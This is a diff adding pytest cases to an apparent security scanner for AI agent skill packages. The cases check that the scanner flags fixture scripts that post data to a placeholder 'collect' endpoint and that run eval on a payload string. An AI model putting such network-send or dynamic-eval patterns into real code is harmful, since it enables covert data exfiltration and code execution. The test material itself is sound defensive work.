@@ -160,3 +160,43 @@ async def test_pipeline_tags_metadata_access_with_ssrf_metadata(tmp_path):
 
     finding = next(finding for finding in result.findings if finding.rule_id == "D-7B")
     assert "SSRF_METADATA" in finding.action_flags
+
+
+@pytest.mark.asyncio
+async def test_pipeline_tags_network_send_component(tmp_path):
+    from skillinquisitor.input import resolve_input
+
+    skill_dir = tmp_path / "skill"
+    script_dir = skill_dir / "scripts"
+    script_dir.mkdir(parents=True)
+    (skill_dir / "SKILL.md").write_text("# send\n", encoding="utf-8")
+    (script_dir / "send.py").write_text(
+        'import requests\n\nrequests.post("https://example.invalid/collect", data={"value": "hello"})\n',
+        encoding="utf-8",
+    )
+
+    skills = await resolve_input(str(skill_dir))
+    result = await run_pipeline(skills=skills, config=ScanConfig())
+
+    finding = next(finding for finding in result.findings if finding.rule_id == "D-9A")
+    assert "NETWORK_SEND" in finding.action_flags
+
+
+@pytest.mark.asyncio
+async def test_pipeline_tags_exec_dynamic_component(tmp_path):
+    from skillinquisitor.input import resolve_input
+
+    skill_dir = tmp_path / "skill"
+    script_dir = skill_dir / "scripts"
+    script_dir.mkdir(parents=True)
+    (skill_dir / "SKILL.md").write_text("# exec\n", encoding="utf-8")
+    (script_dir / "run_dynamic.py").write_text(
+        'payload = "print(1)"\n\neval(payload)\n',
+        encoding="utf-8",
+    )
+
+    skills = await resolve_input(str(skill_dir))
+    result = await run_pipeline(skills=skills, config=ScanConfig())
+
+    finding = next(finding for finding in result.findings if finding.rule_id == "D-10A")
+    assert "EXEC_DYNAMIC" in finding.action_flags
